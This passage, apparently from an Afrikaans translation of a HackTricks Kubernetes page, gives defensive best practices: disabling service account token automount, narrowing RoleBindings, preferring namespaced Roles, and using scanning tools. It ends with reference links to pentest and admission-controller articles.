../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md
{{#endref}}

## Beste Praktyke

### **Deaktiveer Automount van Diensrekening Tokens**

- **Pods en Diensrekeninge**: Standaard monteer pods 'n diensrekeningtoken. Om sekuriteit te verbeter, laat Kubernetes die deaktivering van hierdie automount-funksie toe.
- **Hoe om toe te pas**: Stel `automountServiceAccountToken: false` in die konfigurasie van diensrekeninge of pods vanaf Kubernetes weergawe 1.6.

### **Beperkte Gebruikerstoewysing in RoleBindings/ClusterRoleBindings**

- **Selektiewe Insluiting**: Verseker dat slegs nodige gebruikers ingesluit word in RoleBindings of ClusterRoleBindings. Oudit gereeld en verwyder onbelangrike gebruikers om strenger sekuriteit te handhaaf.

### **Namespace-Spesifieke Rolle Bo Cluster-Wye Rolle**

- **Rolle vs. ClusterRoles**: Verkies om Rolle en RoleBindings te gebruik vir namespace-spesifieke toestemmings eerder as ClusterRoles en ClusterRoleBindings, wat cluster-wyd van toepassing is. Hierdie benadering bied fynere beheer en beperk die omvang van toestemmings.

### **Gebruik geoutomatiseerde gereedskap**

{{#ref}}
https://github.com/cyberark/KubiScan
{{#endref}}

{{#ref}}
https://github.com/aquasecurity/kube-hunter
{{#endref}}

{{#ref}}
https://github.com/aquasecurity/kube-bench
{{#endref}}

## **Verwysings**

- [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
- [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
- [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

{{#include ../../../banners/hacktricks-training.md}}
